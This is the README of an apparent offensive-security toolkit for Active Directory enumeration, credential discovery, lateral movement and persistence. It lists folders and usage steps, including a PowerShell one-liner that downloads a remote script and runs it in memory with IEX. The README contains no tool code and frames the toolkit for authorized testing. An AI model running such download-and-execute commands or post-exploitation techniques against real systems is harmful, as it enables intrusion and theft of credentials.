# Infra-Ops

Toolkit focused on Active Directory enumeration, analysis, and operational tasks in Windows environments.

## Overview

This repository contains a collection of scripts and utilities designed to assist with:

* Active Directory enumeration
* User and group analysis
* Credential discovery techniques
* Network and domain reconnaissance
* Post-exploitation operations

The tools included are intended for lab environments, security research, and authorized assessments.

---

## Structure

```
Infra-Ops/
├── enumeration/
├── credentials/
├── lateral-movement/
├── persistence/
├── utils/
└── notes/
```

* **enumeration/** → Domain, users, groups, shares, services
* **credentials/** → Scripts for credential discovery and parsing
* **lateral-movement/** → Tools for pivoting and access expansion
* **persistence/** → Techniques and helpers for maintaining access
* **utils/** → Helper scripts and automation
* **notes/** → Personal notes, cheatsheets, and references

---

## Usage

Clone the repository:

```bash
git clone https://github.com/<your-username>/Infra-Ops.git
cd Infra-Ops
```

Example (PowerShell execution):

```powershell
.\enumeration\ad_enum.ps1
```

Or execute remotely:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/<your-username>/Infra-Ops/main/enumeration/ad_enum.ps1')
```

---

## Requirements

* Windows environment (domain-joined preferred)
* PowerShell 3.0+
* Appropriate privileges depending on the operation

---

## Notes

* Scripts are provided as-is and may require adaptation depending on the environment.
* Some tools may generate logs or trigger security controls.
* Always validate output manually.

---

## Disclaimer

This repository is intended for **educational purposes and authorized security testing only**.
Do not use these tools in environments without proper authorization.

---

## Author

Maintained by OmarVillaWolf
